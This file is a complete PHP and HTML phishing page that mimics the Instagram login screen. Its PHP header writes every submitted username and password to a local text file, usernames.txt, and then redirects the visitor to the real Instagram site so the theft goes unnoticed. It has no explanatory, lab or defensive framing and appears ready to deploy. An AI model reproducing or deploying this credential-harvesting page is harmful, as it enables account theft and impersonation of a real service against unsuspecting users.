<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
    file_put_contents("usernames.txt", $data, FILE_APPEND);
    header("Location: https://www.instagram.com");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Instagram login</title><meta charset="UTF-8"></head>
<body style="background: #fafafa; font-family: -apple-system, BlinkMacSystemFont, sans-serif; text-align: center; margin-top: 100px;">
<div style="background: white; width: 350px; margin: auto; padding: 40px; border: 1px solid #dbdbdb; border-radius: 1px;">
<h1 style="font-family: 'Billabong', cursive; font-size: 48px;">Instagram</h1>
<form method="post">
<input type="text" name="username" placeholder="Phone number, username, or email" style="width: 90%; padding: 10px; margin: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px;" required><br>
<input type="password" name="password" placeholder="Password" style="width: 90%; padding: 10px; margin: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px;" required><br>
<button type="submit" style="background: #0095f6; color: white; width: 95%; padding: 8px; border: none; border-radius: 4px; font-weight: bold;">Log In</button>
</form>
</div>
</body>
</html>
